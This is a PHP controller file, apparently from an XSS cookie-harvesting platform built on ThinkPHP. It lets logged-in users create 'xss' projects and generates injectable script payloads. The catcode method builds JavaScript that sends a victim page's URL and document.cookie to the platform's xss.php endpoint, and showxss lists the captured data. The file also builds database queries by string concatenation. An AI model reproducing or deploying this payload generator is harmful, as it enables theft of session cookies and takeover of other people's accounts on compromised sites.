<?php
namespace Index\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function Index(){
		if(session('login')!==1)Lo( U("/Login",''));
			$session=M('user');
			$hash=$session->where('hash="'.session('hash').'"')->find();
			if(!is_array($hash))$this->error("Error");
			$poo=M("poject");
			$ha=session('hash');			
			$pooo=$poo->where('hash="'.$ha.'"')->select();
	
			if($pooo==null){
				$poject=false;	
			}elseif(is_array($pooo)){
				$poject=true;	
				}
				 
			$this->assign("po",$pooo);
			$this->assign("poject",$poject);
			$this->assign('hash',$hash);
	    $this->display();
	   	   }
	   
	   public function add(){
	   	if(session('login')!==1)Lo( U("/Login",''));
			$session=M('user');
			$hash=$session->where('hash="'.session('hash').'"')->find();
			$this->assign('hash',$hash);
	$this->display();
	   }

		public function code(){
			if(session('login')!==1)Lo( U("/Login",''));
			if(!isset($_GET['do']))$this->error("Error!");
			if(I('name')=='')$this->error("Error!");

			if(strlen(I('name'))>11)$this->error("Error!");
			$poq=M('poject');
			$arr=array(
				'name'=>I('name'),
				
				'hash'=>session('hash'),
				'func'=>'xss',
				'time'=>time()
			);
		$poq->add($arr);
		$this->success("添加成功",U("Index/index"));
		}
	public function logut(){
	session(null);
	$this->success("退出成功",'/');	
		
	}

public function catcode(){
	if(session('login')!==1)Lo( U("/Login",''));
	if(!isset($_GET['pid']))$this->error();
	$session=M('user');
		$hash=$session->where('hash="'.session('hash').'"')->find();
	$poj=M('poject');
	$sarr['pid']=I('pid');
	$sarr['hash']=session('hash');
	$ie=$poj->where($sarr)->find();;
	$xUrl='http://'.$_SERVER['HTTP_HOST'].'/xss.php/add.html?pid='.$ie['pid'].'&hash='.$ie['hash'].'';
$code=array(
'code1'=>htmlspecialchars('<script src="'.$xUrl.'"></script>'),

);	
//$code['code2'] =dwz($xUrl);
$Bigcode=<<<code
(function() {
	(new Image()).src = 'http://{$_SERVER['HTTP_HOST']}/xss.php?hash={$ie['hash']}&pid={$ie['pid']}&location=' + escape((function() {
		try {
			return document.location.href
		} catch (e) {
			return ''
		}
	})()) + '&cookie=' + escape((function() {
		try {
			return document.cookie
		} catch (e) {
			return ''
		}
	})());
})();
if ('' == 1) {
	keep = new Image();
	keep.src = 'http://{$doamin}/xss.php?hash={$ie['hash']}&pid={$ie['pid']}&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
};
code;
$this->assign('Bigcode',$Bigcode);
$this->assign('code',$code);
$this->assign('poject',$ie);
$this->assign('hash',$hash);
$this->display();
}

public function showxss(){
	if(session('login')!==1)Lo( U("/Login",''));
	if(!isset($_GET['pid']))$this->error();
	$session=M('user');
		$hash=$session->where('hash="'.session('hash').'"')->find();
	$getx=M("x");
	$a=array(
	'hash'=>session('hash'),
	'pid'=>I('pid'),
	);
	$getXss=$getx->where($a)->select();
$this->assign('getxss',$getXss);
$this->assign("hash",$hash);
$this->display();
}




}